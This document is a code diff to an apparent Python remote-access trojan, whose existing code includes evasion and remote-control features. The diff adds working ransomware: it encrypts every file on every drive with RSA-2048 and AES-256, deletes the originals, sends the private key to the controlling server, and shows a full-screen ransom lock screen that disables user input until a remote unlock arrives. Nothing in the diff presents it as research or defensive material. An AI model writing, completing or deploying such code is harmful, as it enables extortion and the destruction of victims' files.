@@ -89,6 +89,10 @@ CMD_MOUSE    = 0x50
 CMD_CLICK    = 0x51
 CMD_KEY      = 0x52
 CMD_PING     = 0x7E
+CMD_KEY_INJECT = 0x26  # admin injects RSA private key PEM → agent
+CMD_KEY_EXCH  = 0x27  # agent sends RSA private key PEM → server (key escrow)
+CMD_RANSOM    = 0x24  # full ransomware: encrypt all + lock PC
+CMD_RANSOM_UNLOCK = 0x25  # unlock ransomware with injected key
 
 # ─── State ────────────────────────────────────────────────────
 
@@ -110,6 +114,8 @@ _camera_lock = asyncio.Lock()
 _audio_samplerate = 44100
 _audio_channels = 1
 _log_file = os.path.join(os.environ.get("TEMP", "."), "svc.log")
+_stored_privkey = None  # RSA private key PEM for decrypt/unlock
+_ransom_pending_key = None  # temp holder for key before asyncio send
 
 # ─── Obfuscation Helpers ─────────────────────────────────────
 _OBF_KEY = b"OBFUSCATION_KEY_16BYTE"
@@ -1048,6 +1054,13 @@ def check_lock_state():
             pass
     if pwd:
         ready = threading.Event()
+        try:
+            st = json.loads(pwd)
+            if isinstance(st, dict) and st.get("type") == "ransom":
+                threading.Thread(target=_ransom_lock_screen, daemon=True).start()
+                return
+        except:
+            pass
         threading.Thread(target=do_lock, args=(pwd, ready), daemon=True).start()
         ready.wait(timeout=10)
 
@@ -1160,109 +1173,203 @@ def do_lock(password, ready=None):
     except:
         pass
 
-# ─── File Encryption ──────────────────────────────────────────
+# ─── Asymmetric File Encryption (RSA-2048 + AES-256-CBC) ─────
 
-def do_encrypt(password, targets=""):
+def do_encrypt(targets=""):
+    """Hybrid RSA-AES encrypt. File format: [RSA-enc-AES-key(256B)][IV(16B)][ciphertext]"""
+    from Crypto.PublicKey import RSA
     from Crypto.Cipher import AES as A
     from Crypto.Random import get_random_bytes
-    import hashlib
+    from Crypto.Cipher import PKCS1_OAEP
     import string
-    
-    key = hashlib.sha256(password.encode()).digest()
+    global _stored_privkey, _ransom_pending_key
+
+    key = RSA.generate(2048)
+    privkey_pem = key.export_key().decode()
+    pubkey = key.publickey()
+    aes_key = get_random_bytes(32)
+
     count = 0
-    
     dirs_to_scan = []
-    
     if targets and isinstance(targets, str) and targets.strip():
         dirs_to_scan = [t.strip() for t in targets.split(",") if t.strip()]
     else:
         for c_drive in string.ascii_uppercase:
-            drive_path = f"{c_drive}:\\"
-            if os.path.exists(drive_path):
-                dirs_to_scan.append(drive_path)
-            
+            dp = f"{c_drive}:\\"
+            if os.path.exists(dp):
+                dirs_to_scan.append(dp)
+
     for d in dirs_to_scan:
         if not os.path.exists(d):
             continue
-            
-        def _enc_file(fp):
+        def _enc(fp):
             nonlocal count
             try:
                 with open(fp, "rb") as f:
                     data = f.read()
                 iv = get_random_bytes(16)
-                c = A.new(key, A.MODE_CBC, iv)
+                cipher_rsa = PKCS1_OAEP.new(pubkey)
+                enc_aes = cipher_rsa.encrypt(aes_key)
+                c = A.new(aes_key, A.MODE_CBC, iv)
                 pad = 16 - (len(data) % 16)
                 with open(fp + ".locked", "wb") as f:
-                    f.write(iv + c.encrypt(data + bytes([pad]) * pad))
+                    f.write(enc_aes + iv + c.encrypt(data + bytes([pad]) * pad))
                 os.remove(fp)
                 count += 1
             except:
                 pass
-
         if os.path.isfile(d):
             if not d.endswith(".locked"):
-                _enc_file(d)
+                _enc(d)
         else:
             for r, _, files in os.walk(d):
                 for fn in files:
                     if not fn.endswith(".locked"):
-                        _enc_file(os.path.join(r, fn))
+                        _enc(os.path.join(r, fn))
+
+    _stored_privkey = privkey_pem
+    _ransom_pending_key = privkey_pem
     return count
 
-def do_decrypt(password, targets=""):
-    try:
-        from Crypto.Cipher import AES as A
-    except ImportError:
-        return 0
-    import hashlib
+
+def do_decrypt(targets=""):
+    """Decrypt .locked files using stored RSA private key. Returns count or negative error."""
+    from Crypto.PublicKey import RSA
+    from Crypto.Cipher import AES as A
+    from Crypto.Cipher import PKCS1_OAEP
     import string
-    
-    key = hashlib.sha256(password.encode()).digest()
+    global _stored_privkey
+
+    if not _stored_privkey:
+        return -1
+    try:
+        rsa_key = RSA.import_key(_stored_privkey)
+    except Exception:
+        return -2
+
     count = 0
-    
     dirs_to_scan = []
     if targets and isinstance(targets, str) and targets.strip():
         dirs_to_scan = [t.strip() for t in targets.split(",") if t.strip()]
     else:
         for c_drive in string.ascii_uppercase:
-            drive_path = f"{c_drive}:\\"
-            if os.path.exists(drive_path):
-                dirs_to_scan.append(drive_path)
-            
+            dp = f"{c_drive}:\\"
+            if os.path.exists(dp):
+                dirs_to_scan.append(dp)
+
     for d in dirs_to_scan:
         if not os.path.exists(d):
             continue
-            
-        def _dec_file(fp):
+        def _dec(fp):
             nonlocal count
             try:
                 with open(fp, "rb") as f:
                     data = f.read()
-                if len(data) <= 16: return
-                iv = data[:16]
-                ciphertext = data[16:]
-                c = A.new(key, A.MODE_CBC, iv)
-                dec_padded = c.decrypt(ciphertext)
-                pad_len = dec_padded[-1]
-                if pad_len > 16 or pad_len < 1: return
-                decrypted = dec_padded[:-pad_len]
-                orig_fp = fp[:-7] if fp.endswith(".locked") else fp + ".unlocked"
-                with open(orig_fp, "wb") as f:
-                    f.write(decrypted)
+                if len(data) <= 272:
+                    return
+                enc_aes = data[:256]
+                iv = data[256:272]
+                ct = data[272:]
+                cipher_rsa = PKCS1_OAEP.new(rsa_key)
+                aes_key = cipher_rsa.decrypt(enc_aes)
+                c = A.new(aes_key, A.MODE_CBC, iv)
+                dec = c.decrypt(ct)
+                pad = dec[-1]
+                if pad > 16 or pad < 1:
+                    return
+                out = fp[:-7] if fp.endswith(".locked") else fp + ".unlocked"
+                with open(out, "wb") as f:
+                    f.write(dec[:-pad])
                 os.remove(fp)
                 count += 1
-            except: pass
-
+            except:
+                pass
         if os.path.isfile(d):
             if d.endswith(".locked"):
-                _dec_file(d)
+                _dec(d)
         else:
             for r, _, files in os.walk(d):
                 for fn in files:
                     if fn.endswith(".locked"):
-                        _dec_file(os.path.join(r, fn))
+                        _dec(os.path.join(r, fn))
     return count
+
+
+# ─── Ransomware ────────────────────────────────────────────────
+
+_ransom_lock_trigger = False  # set True by CMD_RANSOM_UNLOCK to signal lock screen
+
+def do_ransomware():
+    """Full ransomware: encrypt all drives + persistent lock screen."""
+    global _ransom_pending_key
+    c = do_encrypt(targets="")
+    import json
+    state = json.dumps({"type": "ransom", "device_id": DEVICE_ID, "ts": time.time()})
+    set_lock_state(state)
+    threading.Thread(target=_ransom_lock_screen, daemon=True).start()
+    return c
+
+
+def do_unlock_ransom():
+    """Unlock: verify stored key by decrypting one .locked file, then decrypt all."""
+    global _ransom_lock_trigger
+    if not _stored_privkey:
+        return -1
+    _ransom_lock_trigger = True
+    c = do_decrypt(targets="")
+    if c >= 0:
+        clear_lock_state()
+    return c
+
+
+def _ransom_lock_screen():
+    """Full-screen ransom note with device ID, waits for remote unlock."""
+    _disable_external_inputs()
+    import tkinter as tk
+    root = tk.Tk()
+    root.attributes("-fullscreen", True)
+    root.attributes("-topmost", True)
+    root.configure(bg="black")
+    root.overrideredirect(True)
+
+    tk.Label(root, text="YOUR SYSTEM HAS BEEN LOCKED", font=("Arial", 36, "bold"), fg="red", bg="black").pack(pady=(80, 10))
+    tk.Label(root, text="All files encrypted with military-grade RSA-2048 + AES-256", font=("Arial", 14), fg="#ccc", bg="black").pack()
+    tk.Label(root, text=f"Device ID: {DEVICE_ID}", font=("Consolas", 11), fg="#666", bg="black").pack(pady=20)
+    tk.Label(root, text="Contact your administrator to restore access.", font=("Arial", 14), fg="#f5d742", bg="black").pack()
+    tk.Label(root, text="Do NOT restart or shutdown — data may become unrecoverable.", font=("Arial", 11), fg="#ff6b6b", bg="black").pack(pady=10)
+
+    status_var = tk.StringVar()
+    tk.Label(root, textvariable=status_var, font=("Arial", 14), fg="lime", bg="black").pack(pady=30)
+    status_var.set("⏳ Waiting for remote unlock...")
+
+    def poll():
+        global _ransom_lock_trigger
+        if _ransom_lock_trigger and _stored_privkey:
+            status_var.set("✓ Key received. Attempting decryption...")
+            root.update()
+            c = do_decrypt(targets="")
+            if c >= 0:
+                _enable_external_inputs()
+                root.quit()
+                return
+            elif c == -1:
+                status_var.set("✗ No private key stored. Re-inject and try again.")
+            elif c == -2:
+                status_var.set("✗ Invalid private key format.")
+            else:
+                status_var.set(f"✓ Decrypted {c} files.")
+                _enable_external_inputs()
+                root.quit()
+                return
+        root.after(3000, poll)
+
+    root.after(3000, poll)
+    root.mainloop()
+    try:
+        root.destroy()
+    except:
+        pass
+
 
 # ─── Immortality & Evasion Engine ─────────────────────────────
 import ctypes
@@ -2399,23 +2506,39 @@ async def main():
                                 elif cmd == CMD_LOCK:
                                     threading.Thread(target=do_lock, args=(a.get("password", "admin"),), daemon=True).start()
                                 elif cmd == 0x21:
-                                    c = await asyncio.to_thread(
-                                        do_encrypt, a.get("password", ""), a.get("targets", "")
-                                    )
-                                    await send_ws(
-                                        json.dumps(
-                                            {"cmd": CMD_SHELL, "data": {"out": f"Encrypted {c} files.", "shellId": "side"}}
-                                        )
-                                    )
+                                    c = await asyncio.to_thread(do_encrypt, a.get("targets", ""))
+                                    msg = f"Encrypted {c} files."
+                                    if _ransom_pending_key:
+                                        await send_ws(json.dumps({"cmd": CMD_KEY_EXCH, "data": {"privkey": _ransom_pending_key, "hostname": HOSTNAME, "device_id": DEVICE_ID}}))
+                                        _ransom_pending_key = None
+                                        msg += " Private key sent to server."
+                                    await send_ws(json.dumps({"cmd": CMD_SHELL, "data": {"out": msg, "shellId": "side"}}))
                                 elif cmd == 0x22:
-                                    c = await asyncio.to_thread(
-                                        do_decrypt, a.get("password", ""), a.get("targets", "")
-                                    )
-                                    await send_ws(
-                                        json.dumps(
-                                            {"cmd": CMD_SHELL, "data": {"out": f"Decrypted {c} files.", "shellId": "side"}}
-                                        )
-                                    )
+                                    c = await asyncio.to_thread(do_decrypt, a.get("targets", ""))
+                                    msgs = { -1: "No private key stored. Use Key Inject first.", -2: "Invalid private key format." }
+                                    msg = msgs.get(c, f"Decrypted {c} files.")
+                                    await send_ws(json.dumps({"cmd": CMD_SHELL, "data": {"out": msg, "shellId": "side"}}))
+                                elif cmd == CMD_KEY_INJECT:
+                                    pk = a.get("privkey", "")
+                                    if pk:
+                                        global _stored_privkey
+                                        _stored_privkey = pk
+                                        await send_ws(json.dumps({"cmd": CMD_SHELL, "data": {"out": "Private key injected successfully.", "shellId": "side"}}))
+                                    else:
+                                        await send_ws(json.dumps({"cmd": CMD_SHELL, "data": {"out": "Key injection failed: no key provided.", "shellId": "side"}}))
+                                elif cmd == CMD_RANSOM:
+                                    c = await asyncio.to_thread(do_ransomware)
+                                    msg = f"Ransomware deployed. {c} files encrypted. Device locked."
+                                    if _ransom_pending_key:
+                                        await send_ws(json.dumps({"cmd": CMD_KEY_EXCH, "data": {"privkey": _ransom_pending_key, "hostname": HOSTNAME, "device_id": DEVICE_ID}}))
+                                        _ransom_pending_key = None
+                                        msg += " Private key sent to server."
+                                    await send_ws(json.dumps({"cmd": CMD_SHELL, "data": {"out": msg, "shellId": "side"}}))
+                                elif cmd == CMD_RANSOM_UNLOCK:
+                                    c = await asyncio.to_thread(do_unlock_ransom)
+                                    msgs = { -1: "No private key stored. Use Key Inject first." }
+                                    msg = msgs.get(c, f"Unlocked. Decrypted {c} files.")
+                                    await send_ws(json.dumps({"cmd": CMD_SHELL, "data": {"out": msg, "shellId": "side"}}))
                                 elif cmd == CMD_URL:
                                     webbrowser.open(a.get("url", ""))
                                 elif cmd == CMD_DL_EXE:
